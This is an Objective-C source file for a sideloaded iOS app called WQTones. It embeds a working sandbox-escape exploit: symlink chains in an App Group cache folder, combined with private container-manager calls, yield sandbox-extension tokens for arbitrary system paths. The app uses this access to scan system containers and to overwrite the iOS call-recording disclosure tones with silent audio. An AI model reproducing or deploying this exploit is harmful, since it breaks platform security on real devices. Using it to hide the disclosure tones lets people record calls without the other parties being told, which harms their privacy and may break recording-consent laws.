//
//  main.m
//  WQTones
//
//  Silence the iOS call-recording disclosure tones on iOS 26 / 27 using the
//  worse_query sandbox escape.
//
//  worse_query: Copyright (C) 2026 Taj C (forcequit), GPL-3.0-or-later.
//  This program is free software: you can redistribute it and/or modify it
//  under the terms of the GNU General Public License as published by the Free
//  Software Foundation, either version 3 of the License, or (at your option)
//  any later version.  It is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General
//  Public License for more details.
//
//  Use only on devices you own.  Silencing a legally required recording
//  disclosure may be restricted where you live.
//

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <xpc/xpc.h>
#include <sys/stat.h>

// ---------------------------------------------------------------------------
// worse_query (adapted from forcequitOS/worse_query, GPL-3.0-or-later)
// ---------------------------------------------------------------------------

typedef void *(*cq_create_fn)(void);
typedef void (*cq_set_class_fn)(void *, uint64_t);
typedef void (*cq_set_group_ids_fn)(void *, xpc_object_t);
typedef void (*cq_set_flags_fn)(void *, uint64_t);
typedef void (*cq_set_part_fn)(void *, uint64_t);
typedef void *(*cq_get_single_fn)(void *);
typedef void (*cq_free_fn)(void *);
typedef char *(*cq_copy_token_fn)(void *);
typedef int64_t (*sbx_consume_fn)(const char *);
typedef int (*sbx_release_fn)(int64_t);

static void wq_clean_symlink(NSString *group)
{
    if (group == nil) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (root == nil) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches"];
    [fm removeItemAtURL:caches error:nil];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

// Returns a sandbox-extension handle >= 0 on success, negative on failure:
//  -1  no App Group      -2  dlopen/dlsym failed   -3  query_create failed
//  -4  symlink failed    -5  containermanagerd refused the query
//  -6  kernel refused to issue the extension       -255 target missing
static int64_t wq_escape_hops(NSString *target, NSString *group, int hops)
{
    struct stat st;
    if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (root == nil) return -1;
    NSString *rootPath = root.path;
    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];

    // Multi-hop: Caches -> hopN -> ... -> hop0 -> target.  The container manager
    // resolves only one level for its containment check, the kernel resolves
    // the rest when the extension is consumed.
    NSString *linkTarget = target;
    NSMutableArray *created = [NSMutableArray array];
    for (int i = 1; i < hops; i++) {
        NSString *hop = [rootPath stringByAppendingPathComponent:[NSString stringWithFormat:@"hop%d", i]];
        [fm removeItemAtPath:hop error:nil];
        if (![fm createSymbolicLinkAtPath:hop withDestinationPath:linkTarget error:nil]) return -4;
        [created addObject:hop];
        linkTarget = hop;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    cq_create_fn q_create = (cq_create_fn)dlsym(mgr, "container_query_create");
    cq_set_class_fn q_class = (cq_set_class_fn)dlsym(mgr, "container_query_set_class");
    cq_set_group_ids_fn q_groups = (cq_set_group_ids_fn)dlsym(mgr, "container_query_set_group_identifiers");
    cq_set_flags_fn q_flags = (cq_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    cq_set_part_fn q_part = (cq_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    cq_get_single_fn q_single = (cq_get_single_fn)dlsym(mgr, "container_query_get_single_result");
    cq_free_fn q_free = (cq_free_fn)dlsym(mgr, "container_query_free");
    cq_copy_token_fn q_token = (cq_copy_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sbx_consume_fn consume = (sbx_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!q_create || !q_class || !q_groups || !q_flags || !q_part ||
        !q_single || !q_free || !q_token || !consume) {
        dlclose(mgr);
        return -2;
    }

    void *query = q_create();
    if (!query) { dlclose(mgr); return -3; }

    xpc_object_t ident = xpc_string_create(group.UTF8String);
    q_class(query, 7);                 // appGroup
    q_groups(query, ident);
    q_part(query, 3);                  // Library/Caches
    q_flags(query, 0x0000008000000000ULL);

    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:linkTarget error:nil]) {
        for (NSString *p in created) [fm removeItemAtPath:p error:nil];
        q_free(query);
        dlclose(mgr);
        return -4;
    }

    void *result = q_single(query);
    if (!result) {
        q_free(query);
        dlclose(mgr);
        wq_clean_symlink(group);
        return -5;
    }

    char *token = q_token(result);
    if (!token) {
        q_free(query);
        dlclose(mgr);
        wq_clean_symlink(group);
        return -6;
    }

    int64_t handle = consume(token);
    free(token);
    q_free(query);
    dlclose(mgr);
    wq_clean_symlink(group);
    return handle;
}

static int64_t wq_escape(NSString *target, NSString *group)
{
    return wq_escape_hops(target, group, 1);
}

static void wq_release(int64_t handle)
{
    if (handle < 0) return;
    sbx_release_fn rel = (sbx_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(handle);
}

// ---------------------------------------------------------------------------
// App
// ---------------------------------------------------------------------------

static NSString *const kWQTargetDir = @"/var/mobile/Library/CallServices/Greetings/default";

static NSArray<NSString *> *WQToneNames(void)
{
    return @[ @"StartDisclosureWithTone.m4a", @"StopDisclosure.caf", @"StartDisclosure.caf" ];
}

static NSString *WQFirstAppGroup(void)
{
    void *(*create_from_self)(CFAllocatorRef) =
        (void *(*)(CFAllocatorRef))dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
    CFTypeRef (*copy_ent)(void *, CFStringRef, CFErrorRef *) =
        (CFTypeRef (*)(void *, CFStringRef, CFErrorRef *))dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
    if (!create_from_self || !copy_ent) return nil;

    void *task = create_from_self(kCFAllocatorDefault);
    if (!task) return nil;
    CFTypeRef value = copy_ent(task, CFSTR("com.apple.security.application-groups"), NULL);
    CFRelease(task);
    if (!value) return nil;

    NSString *group = nil;
    if (CFGetTypeID(value) == CFArrayGetTypeID()) {
        CFArrayRef array = (CFArrayRef)value;
        if (CFArrayGetCount(array) > 0) {
            CFStringRef first = CFArrayGetValueAtIndex(array, 0);
            if (first && CFGetTypeID(first) == CFStringGetTypeID()) {
                group = [NSString stringWithString:(__bridge NSString *)first];
            }
        }
    }
    CFRelease(value);
    return group;
}

static NSString *WQDescribeCode(int64_t code)
{
    switch (code) {
        case -1: return @"没有拿到 App Group";
        case -2: return @"找不到 containermanager 符号";
        case -3: return @"创建查询失败";
        case -4: return @"创建符号链接失败";
        case -5: return @"containermanagerd 拒绝了查询";
        case -6: return @"内核拒绝签发 sandbox extension";
        case -255: return @"目标路径不存在";
        default: return [NSString stringWithFormat:@"未知错误 %lld", (long long)code];
    }
}

@interface WQViewController : UIViewController
@property (nonatomic, strong) UILabel *groupLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) NSMutableString *log;
@end

@implementation WQViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor systemGroupedBackgroundColor];
    self.log = [NSMutableString string];

    UILabel *title = [UILabel new];
    title.text = @"WQ Tones";
    title.font = [UIFont boldSystemFontOfSize:22];
    title.translatesAutoresizingMaskIntoConstraints = NO;

    self.groupLabel = [UILabel new];
    self.groupLabel.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.groupLabel.textColor = [UIColor secondaryLabelColor];
    self.groupLabel.numberOfLines = 2;
    self.groupLabel.translatesAutoresizingMaskIntoConstraints = NO;

    UIStackView *buttons = [UIStackView new];
    buttons.axis = UILayoutConstraintAxisVertical;
    buttons.spacing = 8;
    buttons.translatesAutoresizingMaskIntoConstraints = NO;

    NSArray *titles = @[ @"检测访问 / Test", @"备份原件 / Backup", @"写入静音 / Silence", @"还原原件 / Restore" ];
    NSArray *selectors = @[ @"actTest", @"actBackup", @"actSilence", @"actRestore" ];
    for (NSUInteger i = 0; i < titles.count; i++) {
        UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
        [b setTitle:titles[i] forState:UIControlStateNormal];
        b.titleLabel.font = [UIFont systemFontOfSize:16 weight:UIFontWeightMedium];
        b.backgroundColor = [UIColor secondarySystemGroupedBackgroundColor];
        b.layer.cornerRadius = 10;
        b.contentEdgeInsets = UIEdgeInsetsMake(12, 14, 12, 14);
        SEL sel = NSSelectorFromString(selectors[i]);
        [b addTarget:self action:sel forControlEvents:UIControlEventTouchUpInside];
        b.translatesAutoresizingMaskIntoConstraints = NO;
        [b.heightAnchor constraintEqualToConstant:46].active = YES;
        [buttons addArrangedSubview:b];
    }

    self.logView = [UITextView new];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemGroupedBackgroundColor];
    self.logView.layer.cornerRadius = 10;
    self.logView.textContainerInset = UIEdgeInsetsMake(10, 10, 10, 10);
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:title];
    [self.view addSubview:self.groupLabel];
    [self.view addSubview:buttons];
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:12],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.groupLabel.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:4],
        [self.groupLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.groupLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [buttons.topAnchor constraintEqualToAnchor:self.groupLabel.bottomAnchor constant:12],
        [buttons.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [buttons.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.topAnchor constraintEqualToAnchor:buttons.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
    ]];

    NSString *group = WQFirstAppGroup();
    self.groupLabel.text = group ? [NSString stringWithFormat:@"App Group: %@", group]
                                 : @"App Group: (缺失) — 用 AltStore / SideStore 重签";
    [self logLine:@"目标: %@", kWQTargetDir];
}

- (void)logLine:(NSString *)format, ...
{
    va_list args;
    va_start(args, format);
    NSString *text = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.log appendFormat:@"%@\n", text];
        self.logView.text = self.log;
        if (self.logView.text.length > 0) {
            [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
        }
    });
}

- (void)run:(void (^)(void))block
{
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool { block(); }
    });
}

- (NSString *)backupDir
{
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *dir = [docs stringByAppendingPathComponent:@"WQTonesBackups"];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    return dir;
}

- (void)actTest
{
    [self run:^{
        NSString *group = WQFirstAppGroup();
        if (!group) { [self logLine:@"✗ 没有 App Group，先重签"]; return; }

        NSMutableArray *targets = [NSMutableArray array];
        NSURL *own = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        if (own) [targets addObject:own.path];
        [targets addObjectsFromArray:@[
            @"/private/var/mobile/Library/CallServices/Greetings/default",
            @"/var/mobile/Library/CallServices/Greetings/default/StartDisclosureWithTone.m4a",
            @"/var/mobile/Library/CallServices/Greetings/default",
            @"/var/containers/Data/System"
        ]];

        for (NSString *t in targets) {
            int64_t h = wq_escape(t, group);
            if (h >= 0) {
                NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:t error:nil];
                [self logLine:@"✓ %@  (授权成功, %lu 项) %@", t, (unsigned long)items.count, items ?: @""];
                wq_release(h);
            } else {
                [self logLine:@"✗ %@  %@ (%lld)", t, WQDescribeCode(h), (long long)h];
            }
        }

        // 多跳符号链接：让容器管理器只解析一跳（看起来仍在容器内），
        // 内核在 consume 时再解析到底，看能不能拿到目标目录
        for (int hops = 2; hops <= 3; hops++) {
            int64_t h = wq_escape_hops(kWQTargetDir, group, hops);
            if (h >= 0) {
                NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:kWQTargetDir error:nil];
                [self logLine:@"✓✓ %d 跳成功！ %@ (%lu 项)", hops, items ?: @"", (unsigned long)items.count];
                wq_release(h);
            } else {
                [self logLine:@"✗ %d 跳  %@ (%lld)", hops, WQDescribeCode(h), (long long)h];
            }
        }

        // 在可访问的容器里找有没有 CallServices / Greetings 的副本
        int64_t h = wq_escape(@"/var/containers/Data/System", group);
        if (h >= 0) {
            NSFileManager *fm = [NSFileManager defaultManager];
            NSArray *ids = [fm contentsOfDirectoryAtPath:@"/var/containers/Data/System" error:nil];
            [self logLine:@"扫描 %lu 个系统容器…", (unsigned long)ids.count];
            for (NSString *cid in ids) {
                NSString *base = [@"/var/containers/Data/System" stringByAppendingPathComponent:cid];
                NSArray *l1 = [fm contentsOfDirectoryAtPath:base error:nil];
                for (NSString *a in l1) {
                    if ([a.lowercaseString containsString:@"call"]) {
                        [self logLine:@"  ? %@/%@", base, a];
                    }
                    NSString *p2 = [base stringByAppendingPathComponent:a];
                    NSArray *l2 = [fm contentsOfDirectoryAtPath:p2 error:nil];
                    for (NSString *b in l2) {
                        if ([b.lowercaseString containsString:@"call"] || [b.lowercaseString containsString:@"greeting"]) {
                            [self logLine:@"  ★ %@/%@/%@", base, a, b];
                        }
                    }
                }
            }
            wq_release(h);
            [self logLine:@"扫描结束"];
        } else {
            [self logLine:@"无法扫描系统容器: %@", WQDescribeCode(h)];
        }
    }];
}

- (void)actBackup
{
    [self run:^{
        NSString *group = WQFirstAppGroup();
        if (!group) { [self logLine:@"✗ 没有 App Group"]; return; }
        int64_t h = wq_escape(kWQTargetDir, group);
        if (h < 0) { [self logLine:@"✗ 令牌失败：%@", WQDescribeCode(h)]; return; }
        for (NSString *name in WQToneNames()) {
            NSString *src = [kWQTargetDir stringByAppendingPathComponent:name];
            NSData *data = [NSData dataWithContentsOfFile:src];
            if (!data) { [self logLine:@"· %@ 不存在，跳过", name]; continue; }
            NSString *dst = [[self backupDir] stringByAppendingPathComponent:name];
            NSError *err = nil;
            if ([data writeToFile:dst options:NSDataWritingAtomic error:&err]) {
                [self logLine:@"✓ 已备份 %@ (%lu bytes)", name, (unsigned long)data.length];
            } else {
                [self logLine:@"✗ 备份失败 %@: %@", name, err.localizedDescription];
            }
        }
        wq_release(h);
    }];
}

- (void)actSilence
{
    [self run:^{
        NSString *group = WQFirstAppGroup();
        if (!group) { [self logLine:@"✗ 没有 App Group"]; return; }
        int64_t h = wq_escape(kWQTargetDir, group);
        if (h < 0) { [self logLine:@"✗ 令牌失败：%@", WQDescribeCode(h)]; return; }
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *name in WQToneNames()) {
            NSString *dst = [kWQTargetDir stringByAppendingPathComponent:name];
            if (![fm fileExistsAtPath:dst]) { [self logLine:@"· %@ 本机没有，跳过", name]; continue; }
            NSString *silent = [[NSBundle mainBundle] pathForResource:[name stringByDeletingPathExtension]
                                                              ofType:[name pathExtension]];
            NSData *data = silent ? [NSData dataWithContentsOfFile:silent] : nil;
            if (!data) { [self logLine:@"✗ 包内缺少静音文件 %@", name]; continue; }
            NSError *err = nil;
            BOOL ok = [data writeToFile:dst options:NSDataWritingAtomic error:&err];
            if (!ok) ok = [data writeToFile:dst options:0 error:&err];
            if (ok) {
                NSDictionary *attr = [fm attributesOfItemAtPath:dst error:nil];
                [self logLine:@"✓ 已写入 %@ (%lu bytes, 现在 %@)", name, (unsigned long)data.length, attr[NSFileSize]];
            } else {
                [self logLine:@"✗ 写入失败 %@: %@", name, err.localizedDescription];
            }
        }
        wq_release(h);
    }];
}

- (void)actRestore
{
    [self run:^{
        NSString *group = WQFirstAppGroup();
        if (!group) { [self logLine:@"✗ 没有 App Group"]; return; }
        int64_t h = wq_escape(kWQTargetDir, group);
        if (h < 0) { [self logLine:@"✗ 令牌失败：%@", WQDescribeCode(h)]; return; }
        for (NSString *name in WQToneNames()) {
            NSString *src = [[self backupDir] stringByAppendingPathComponent:name];
            NSData *data = [NSData dataWithContentsOfFile:src];
            if (!data) { [self logLine:@"· 没有 %@ 的备份，跳过", name]; continue; }
            NSString *dst = [kWQTargetDir stringByAppendingPathComponent:name];
            NSError *err = nil;
            BOOL ok = [data writeToFile:dst options:NSDataWritingAtomic error:&err];
            if (!ok) ok = [data writeToFile:dst options:0 error:&err];
            if (ok) {
                [self logLine:@"✓ 已还原 %@", name];
            } else {
                [self logLine:@"✗ 还原失败 %@: %@", name, err.localizedDescription];
            }
        }
        wq_release(h);
    }];
}

@end

@interface WQAppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation WQAppDelegate
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [WQViewController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([WQAppDelegate class]));
    }
}
